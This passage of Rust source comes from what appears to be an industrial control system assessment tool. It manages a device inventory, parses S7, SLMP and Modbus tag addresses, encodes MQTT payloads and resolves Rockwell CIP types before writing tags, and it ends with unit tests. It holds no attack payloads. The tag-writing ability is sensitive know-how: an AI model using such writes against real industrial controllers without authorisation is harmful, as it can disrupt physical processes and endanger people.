            crate::display::print_success(&format!("Added {ip} (vendor={vendor}, id={id})"));
        }
        DbCmd::List => {
            let devices = db.load_devices()?;
            if devices.is_empty() {
                println!("No devices in database.");
            } else {
                println!("{:<5}  {:<16}  {:<14}  LAST SEEN", "ID", "IP", "VENDOR");
                println!("{}", "-".repeat(60));
                for d in &devices {
                    use std::time::{Duration, SystemTime, UNIX_EPOCH};
                    let ts = UNIX_EPOCH + Duration::from_secs(d.last_seen.cast_unsigned());
                    let elapsed = SystemTime::now().duration_since(ts).unwrap_or_default();
                    let ago = if elapsed.as_secs() < 60 {
                        format!("{}s ago", elapsed.as_secs())
                    } else if elapsed.as_secs() < 3600 {
                        format!("{}m ago", elapsed.as_secs() / 60)
                    } else if elapsed.as_secs() < 86400 {
                        format!("{}h ago", elapsed.as_secs() / 3600)
                    } else {
                        format!("{}d ago", elapsed.as_secs() / 86400)
                    };
                    println!("{:<5}  {:<16}  {:<14}  {}", d.id, d.ip, d.vendor, ago);
                }
                crate::display::print_success(&format!("{} device(s).", devices.len()));
            }
        }
        DbCmd::Show { ip } => {
            let protocols = db.load_protocols(&ip)?;
            if protocols.is_empty() {
                bail!("No protocol inventory saved for {ip}.");
            }
            println!("  Host: {ip}");
            for protocol in protocols {
                let tags = db.load_tags_for_protocol(&ip, &protocol.protocol)?;
                let points = db.load_data_points(&ip, &protocol.protocol)?;
                let port = protocol
                    .port
                    .map_or_else(|| "default".to_string(), |p| p.to_string());
                println!(
                    "  {:<12} port={:<7} last-live={}  tags={}  cached-values={}",
                    protocol.protocol,
                    port,
                    cached_age(protocol.last_seen),
                    tags.len(),
                    points.len(),
                );
            }
        }
        DbCmd::Remove { id } => {
            db.delete_device(id)?;
            crate::display::print_success(&format!("Removed device id={id}"));
        }
        DbCmd::Refs { vendor } => {
            use casket::references;
            let entries: Vec<&references::Reference> = match vendor.as_deref() {
                Some(v) => references::for_vendor(v),
                None => references::all().iter().collect(),
            };
            if entries.is_empty() {
                println!("No references found.");
                println!("Valid slugs: beckhoff siemens schneider rockwell mitsubishi omron");
                println!(
                    "            phoenix ewon modbus iec104 enip snmp malware ics-general general"
                );
            }
            for r in entries {
                println!("[{}]  {}\n  {}\n", r.source, r.title, r.url);
            }
        }
    }
    Ok(())
}

// ===================================================================
// Helpers
// ===================================================================

fn local_ip_for(target: &str) -> String {
    use std::net::UdpSocket;
    let Ok(sock) = UdpSocket::bind("0.0.0.0:0") else {
        return "0.0.0.0".into();
    };
    let _ = sock.connect(format!("{target}:1"));
    sock.local_addr()
        .map_or_else(|_| "0.0.0.0".into(), |a| a.ip().to_string())
}

fn summarize_device(info: &casket::core::autodetect::DeviceInfo) -> String {
    const FIELDS: &[(&str, &str)] = &[
        ("hardware", "Hardware"),
        ("firmware", "FW"),
        ("cpu_state", "CPU"),
        ("product_name", "Product"),
        ("revision", "Rev"),
        ("plc_type", "Type"),
        ("model", "Model"),
        ("version", "Version"),
        ("name", "Name"),
        ("tc_version", "TwinCAT"),
        ("netid", "NetID"),
        ("serial", "Serial"),
        ("snmp_community", "community"),
        ("sys_descr", "sysDescr"),
        ("sys_name", "sysName"),
    ];
    let mut parts = Vec::new();
    for (key, label) in FIELDS {
        let Some(value) = info.fields.get(*key) else {
            continue;
        };
        let text = match value {
            serde_json::Value::String(s) => s.clone(),
            other => other.to_string(),
        };
        if !text.is_empty() {
            parts.push(format!("{label}={text}"));
        }
    }
    if parts.is_empty() {
        info.vendor.to_uppercase()
    } else {
        format!("{}  {}", info.vendor.to_uppercase(), parts.join("  "))
    }
}

fn hex_encode(b: &[u8]) -> String {
    use std::fmt::Write;
    b.iter().fold(String::new(), |mut s, x| {
        let _ = write!(s, "{x:02x}");
        s
    })
}

fn parse_s7_tag_name(name: &str) -> anyhow::Result<(u16, u16, u16)> {
    let s = name.trim_start_matches("DB").trim_start_matches("db");
    let parts: Vec<&str> = s.splitn(3, ':').collect();
    let db_num: u16 = parts.first().and_then(|s| s.parse().ok()).ok_or_else(|| {
        anyhow::anyhow!("Invalid S7 tag name '{name}'; use DB<num> or DB<num>:<offset>:<len>")
    })?;
    if db_num == 0 {
        anyhow::bail!("S7 data blocks start at DB1; DB0 is a reserved internal block");
    }
    let offset: u16 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
    let len: u16 = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(4);
    Ok((db_num, offset, len))
}

fn parse_slmp_tag_name(name: &str) -> anyhow::Result<(&str, u16)> {
    let split_at = name.find(|c: char| c.is_ascii_digit()).ok_or_else(|| {
        anyhow::anyhow!("Invalid SLMP tag '{name}'; use D<addr>, M<addr>, W<addr>, etc.")
    })?;
    let (device, addr_str) = name.split_at(split_at);
    if device.is_empty() {
        anyhow::bail!(
            "Invalid SLMP tag '{name}'; name must start with a device letter, e.g. D100, M10, W1"
        );
    }
    // Valid SLMP word device codes per Mitsubishi SLMP spec
    let valid_devices: &[&str] = &["D", "M", "X", "Y", "B", "W", "R"];
    if !valid_devices.contains(&device) {
        anyhow::bail!(
            "Unknown SLMP device '{device}' in '{name}'; valid devices: D, M, X, Y, B, W, R"
        );
    }
    let addr: u16 = addr_str
        .parse()
        .map_err(|_| anyhow::anyhow!("Invalid address in '{name}'"))?;
    Ok((device, addr))
}

fn parse_modbus_addr(name: &str) -> anyhow::Result<u16> {
    let n: u32 = name.parse().map_err(|_| {
        anyhow::anyhow!("Invalid register '{name}'; use display address (40001) or raw (0)")
    })?;
    // Subtract display offset if user gave display address (40001â€“49999)
    if (40001..=49999).contains(&n) {
        Ok(u16::try_from(n - 40001).unwrap_or(0))
    } else {
        Ok(u16::try_from(n).map_err(|_| anyhow::anyhow!("Address out of range: {n}"))?)
    }
}

fn parse_hex(s: &str) -> Vec<u8> {
    let s = s.trim().trim_start_matches("0x");
    if !s.len().is_multiple_of(2) {
        return vec![];
    }
    s.as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect()
}

/// Encode a CLI MQTT value without making text publishes accidentally look like
/// malformed binary data.  `auto` retains the established raw-hex behaviour
/// for values such as `a1b2`, while allowing ordinary text payloads such as
/// `running`.
fn mqtt_payload(value: &str, type_hint: &str) -> Result<Vec<u8>> {
    match type_hint.to_ascii_lowercase().as_str() {
        "text" | "utf8" | "string" => Ok(value.as_bytes().to_vec()),
        "hex" | "bytes" | "binary" => {
            let bytes = parse_hex(value);
            if bytes.is_empty() && !value.trim().is_empty() {
                bail!(
                    "Invalid MQTT hex payload '{value}': use an even-length value such as 01 or deadbeef"
                );
            }
            Ok(bytes)
        }
        "auto" => {
            let bytes = parse_hex(value);
            if !bytes.is_empty() || value.trim().is_empty() {
                Ok(bytes)
            } else {
                Ok(value.as_bytes().to_vec())
            }
        }
        unsupported => bail!(
            "Unsupported MQTT --type '{unsupported}'; use auto, text, or hex"
        ),
    }
}

fn resolve_rockwell_write_type(
    ip: &str,
    port: u16,
    name: &str,
    type_hint: &str,
    value: &str,
    live_type_lookup: bool,
) -> Result<u16> {
    let explicit = match type_hint.trim().to_ascii_lowercase().as_str() {
        "bool" => Some(0x00C1),
        "sint" => Some(0x00C2),
        "int" => Some(0x00C3),
        "dint" => Some(0x00C4),
        "lint" => Some(0x00C5),
        "real" => Some(0x00CA),
        "auto" => None,
        other => bail!("Unknown --type '{other}': use bool, sint, int, dint, lint, real, or auto"),
    };
    if let Some(type_code) = explicit {
        return Ok(type_code);
    }

    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    if let Some(tag) = db
        .load_tags_for_protocol(ip, "rockwell")?
        .into_iter()
        .find(|tag| tag.name.eq_ignore_ascii_case(name))
    {
        return u16::try_from(tag.tag_type)
            .map_err(|_| anyhow::anyhow!("cached type for {name} is invalid"));
    }
    if let Some(point) = db.load_data_point(ip, "rockwell", &format!("tag:{name}"))? {
        if let Some(type_code) = point
            .data_type
            .as_deref()
            .and_then(rockwell_atomic_type_from_name)
        {
            return Ok(type_code);
        }
    }

    // `--live` must be useful for a leaf whose parent UDT has not yet been
    // enumerated into the cache.  A Read Tag reply starts with the CIP type
    // word, so this is a safe read-only way to determine an atomic leaf's
    // encoding immediately before the requested write.  Structured and array
    // types still pass through the normal non-writable guard in `set_tag`.
    if live_type_lookup {
        use casket::vendors::rockwell::driver;
        let raw = driver::read_tag(ip, port, name)
            .with_context(|| format!("read Rockwell tag {name} to resolve its CIP type"))?;
        return raw
            .get(..2)
            .and_then(|bytes| <[u8; 2]>::try_from(bytes).ok())
            .map(u16::from_le_bytes)
            .ok_or_else(|| anyhow::anyhow!("Rockwell read of {name} returned no CIP type word"));
    }

    // Preserve the historic raw-hex convenience only when the caller really
    // supplied bytes.  Natural literals require a real type, never a guess.
    let raw = parse_hex(value);
    if !raw.is_empty() {
        return Ok(if raw.len() == 1 { 0x00C1 } else { 0x00C4 });
    }
    bail!(
        "Cannot auto-detect the type of {name}. Use --live for a read-only type lookup, run '--live get tags --protocol rockwell -i {ip}' to cache the leaf type, or pass --type bool|sint|int|dint|lint|real."
    )
}

fn rockwell_atomic_type_from_name(name: &str) -> Option<u16> {
    match name.trim().to_ascii_uppercase().as_str() {
        "BOOL" => Some(0x00C1),
        "SINT" => Some(0x00C2),
        "INT" => Some(0x00C3),
        "DINT" => Some(0x00C4),
        "LINT" => Some(0x00C5),
        "REAL" => Some(0x00CA),
        _ => None,
    }
}

fn decode_rockwell_payload(raw: &[u8]) -> Result<(u16, String)> {
    use casket::vendors::rockwell::driver;

    let tag_type = raw
        .get(..2)
        .and_then(|bytes| <[u8; 2]>::try_from(bytes).ok())
        .map(u16::from_le_bytes)
        .ok_or_else(|| anyhow::anyhow!("payload is shorter than the two-byte CIP type word"))?;
    Ok((tag_type, driver::decode_value(tag_type, raw, None)))
}

fn pad_to_width(value: &str, width: usize) -> String {
    let padding = width.saturating_sub(value.chars().count());
    format!("{value}{}", " ".repeat(padding))
}

fn ellipsize(value: &str, width: usize) -> String {
    let mut chars = value.chars();
    let prefix: String = chars.by_ref().take(width).collect();
    if chars.next().is_some() && width > 1 {
        let shortened: String = prefix.chars().take(width - 1).collect();
        format!("{shortened}â€¦")
    } else {
        prefix
    }
}

#[cfg(test)]
mod tests {
    use super::{
        decode_ewon_register, decode_rockwell_payload, diagnostic_context, ellipsize,
        encode_ewon_register, mqtt_payload, parse_hex, rockwell_atomic_type_from_name, set_operation_supported,
        EwonRegisterType, Protocol, SetNoun,
    };

    #[test]
    fn parse_hex_odd_length_returns_empty() {
        // Regression: odd-length input "abc" previously produced [0xab, 0x0c] because
        // .chunks(2) on "abc" yields ["ab", "c"] and "c" parses as 0x0c.
        // Fix: reject any input whose stripped length is not a multiple of 2.
        assert!(
            parse_hex("abc").is_empty(),
            "odd 3-char hex must be rejected"
        );
        assert!(parse_hex("a").is_empty(), "single nibble must be rejected");
        assert!(
            parse_hex("abcde").is_empty(),
            "odd 5-char hex must be rejected"
        );
        assert!(
            parse_hex("0xabc").is_empty(),
            "0x-prefixed odd hex must be rejected"
        );
    }

    #[test]
    fn parse_hex_even_length_parses_correctly() {
        assert_eq!(parse_hex("abcd"), vec![0xab, 0xcd]);
        assert_eq!(parse_hex("0x0102"), vec![0x01, 0x02]);
        assert_eq!(parse_hex("ff00"), vec![0xff, 0x00]);
    }

    #[test]
    fn parse_hex_empty_returns_empty() {
        assert!(parse_hex("").is_empty());
        assert!(parse_hex("0x").is_empty());
        assert!(parse_hex("   ").is_empty());
    }

    #[test]
    fn mqtt_payload_auto_keeps_hex_and_accepts_text() {
        assert_eq!(mqtt_payload("a1b2", "auto").unwrap(), vec![0xa1, 0xb2]);
        assert_eq!(mqtt_payload("running", "auto").unwrap(), b"running");
        assert_eq!(mqtt_payload("a1b2", "text").unwrap(), b"a1b2");
        assert!(mqtt_payload("running", "hex").is_err());
    }

    #[test]
    fn ewon_32_bit_registers_use_low_word_first() {
        assert_eq!(
            encode_ewon_register("305419896", EwonRegisterType::U32).unwrap(),
            vec![0x5678, 0x1234]
        );
        assert_eq!(
            decode_ewon_register(&[0x0000, 0x4293], EwonRegisterType::F32).unwrap(),
            "73.5"
        );
        assert_eq!(
            decode_ewon_register(&[0xFFFF, 0xFFFF], EwonRegisterType::I32).unwrap(),
            "-1"
        );
    }

    #[test]
    fn ewon_float_rejects_non_finite_writes() {
        assert!(encode_ewon_register("NaN", EwonRegisterType::F32).is_err());
        assert!(encode_ewon_register("inf", EwonRegisterType::F32).is_err());
    }

    #[test]
    fn rockwell_bool_payload_decodes_instead_of_rendering_wire_hex() {
        let (tag_type, value) = decode_rockwell_payload(&[0xC1, 0x00, 0x01]).unwrap();
        assert_eq!(tag_type, 0x00C1);
        assert_eq!(value, "true  (1)");
    }

    #[test]
    fn rockwell_real_payload_decodes_little_endian_float() {
        let (tag_type, value) =
            decode_rockwell_payload(&[0xCA, 0x00, 0x00, 0x00, 0x48, 0x41]).unwrap();
        assert_eq!(tag_type, 0x00CA);
        assert_eq!(value, "12.5");
    }

    #[test]
    fn rockwell_leaf_type_names_are_usable_for_auto_writes() {
        assert_eq!(rockwell_atomic_type_from_name("BOOL"), Some(0x00C1));
        assert_eq!(rockwell_atomic_type_from_name("REAL"), Some(0x00CA));
        assert_eq!(rockwell_atomic_type_from_name("STRING"), None);
    }

    #[test]
    fn diagnostic_context_reports_effective_default_port() {
        let context = diagnostic_context("get", Some(Protocol::Rockwell), Some("127.0.0.1"), 0, 5);
        assert!(context.contains("port=44818 [protocol default]"));
        assert!(context.contains("target=127.0.0.1"));
    }

    #[test]
    fn ellipsize_preserves_short_values_and_bounds_long_structs() {
        assert_eq!(ellipsize("12.5", 24), "12.5");
        assert_eq!(ellipsize("abcdefghijklmnopqrstuvwxyz", 8), "abcdefgâ€¦");
    }

    #[test]
    fn unsupported_set_is_reported_before_inventory_freshness_is_checked() {
        let tag = SetNoun::Tag {
            assignment: "TEST=01".into(),
            r#type: "auto".into(),
            retain: false,
        };
        assert!(!set_operation_supported(Protocol::Schneider, &tag));
        assert!(set_operation_supported(Protocol::Rockwell, &tag));
    }
}
